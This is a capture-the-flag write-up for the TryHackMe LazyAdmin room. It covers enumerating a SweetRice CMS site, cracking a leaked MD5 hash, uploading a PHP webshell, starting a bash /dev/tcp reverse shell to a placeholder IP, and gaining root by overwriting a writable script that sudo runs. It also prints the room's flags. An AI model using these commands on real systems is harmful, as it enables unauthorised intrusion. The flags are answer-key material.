# TryHackMe - LazyAdmin Writeup

## Machine Information

- Platform: TryHackMe
- Room: LazyAdmin
- Difficulty: Easy
- Target IP: `10.48.138.148`

---

# Enumeration

## Nmap Scan

Started with a full service and version detection scan.

```bash
sudo nmap -sC -sV -Pn -A 10.48.138.148
```

### Results

```text
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

The website displayed the default Apache Ubuntu page.

---

# Web Enumeration

## Gobuster Scan

Used Gobuster to discover hidden directories.

```bash
gobuster dir -u http://10.48.138.148 \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,html,bak
```

### Result

```text
/content
```

---

# Discovering SweetRice CMS

Visited:

```text
http://10.48.138.148/content/
```

The page revealed the CMS:

```text
SweetRice CMS
```

Admin login panel:

```text
http://10.48.138.148/content/as/
```

---

# Enumerating SweetRice

Checked important directories.

```bash
curl http://10.48.138.148/content/inc/mysql_backup/
```

### Result

Directory listing was enabled.

Found SQL backup:

```text
mysql_bakup_20191129023059-1.5.1.sql
```

Downloaded it:

```bash
wget http://10.48.138.148/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

---

# Extracting Credentials

Read the SQL dump:

```bash
cat mysql_bakup_20191129023059-1.5.1.sql
```

Found credentials inside:

```text
username: manager
hash: 42f749ade7f9e195bf475f37a44cafcb
```

---

# Cracking the Password Hash

Saved the hash:

```bash
echo '42f749ade7f9e195bf475f37a44cafcb' > hash.txt
```

Cracked using John the Ripper:

```bash
john --format=Raw-MD5 hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt
```

### Password

```text
Password123
```

---

# Authenticating to SweetRice

Credentials:

```text
manager : Password123
```

Authenticated using curl:

```bash
curl -c cookies.txt -b cookies.txt \
-X POST "http://10.48.138.148/content/as/?type=signin" \
-d "user=manager&passwd=Password123&rememberMe=1"
```

### Response

```json
{"status":1,"statusInfo":"Login success"}
```

Verified admin access:

```bash
curl -b cookies.txt \
http://10.48.138.148/content/as/
```

---

# Gaining Remote Code Execution

## Creating Webshell

Created a PHP webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

`.php` uploads were blocked.

Renamed the shell:

```bash
cp shell.php shell.phtml
```

---

## Uploading Webshell

Uploaded using authenticated session cookies:

```bash
curl -b cookies.txt \
-F "upload[]=@shell.phtml" \
-F "dir_name=" \
"http://10.48.138.148/content/as/?type=media_center&mode=upload"
```

Verified upload path using Media Center:

```text
/content/attachment/
```

---

## Confirming RCE

Executed command through uploaded shell:

```bash
curl "http://10.48.138.148/content/attachment/shell.phtml?cmd=id"
```

### Result

```text
uid=33(www-data) gid=33(www-data)
```

Remote Code Execution confirmed.

---

# Reverse Shell

## Start Listener

```bash
nc -lvnp 4444
```

## Trigger Reverse Shell

```bash
curl "http://10.48.138.148/content/attachment/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"
```

Received shell:

```text
www-data@THM-Chal
```

---

# Stabilizing Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

# User Flag

Located the flag:

```bash
find / -name user.txt 2>/dev/null
```

### Result

```text
/home/itguy/user.txt
```

Read the flag:

```bash
cat /home/itguy/user.txt
```

### User Flag

```text
THM{63e5bce9271952aad1113b6f1ac28a07}
```

---

# Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

### Result

```text
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Viewed the Perl script:

```bash
cat /home/itguy/backup.pl
```

### Contents

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Checked permissions of `/etc/copy.sh`:

```bash
ls -l /etc/copy.sh
```

The file was writable.

---

# Exploiting Writable Script

Overwrote the script:

```bash
echo '/bin/bash' > /etc/copy.sh
chmod +x /etc/copy.sh
```

Executed the sudo-allowed Perl script:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Root shell obtained.

---

# Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

### Root Flag

```text
THM{6637f41d0177b6f37cb20d775124699f}
```

---

# Final Flags

## User Flag

```text
THM{63e5bce9271952aad1113b6f1ac28a07}
```

## Root Flag

```text
THM{6637f41d0177b6f37cb20d775124699f}
```

---

# Attack Chain Summary

1. Performed Nmap scan
2. Enumerated web directories using Gobuster
3. Discovered SweetRice CMS
4. Found exposed SQL backup
5. Extracted admin hash
6. Cracked password using John
7. Logged into SweetRice admin panel
8. Uploaded `.phtml` webshell
9. Achieved RCE as `www-data`
10. Obtained reverse shell
11. Enumerated sudo permissions
12. Exploited writable `/etc/copy.sh`
13. Escalated privileges to root
14. Retrieved root flag

---
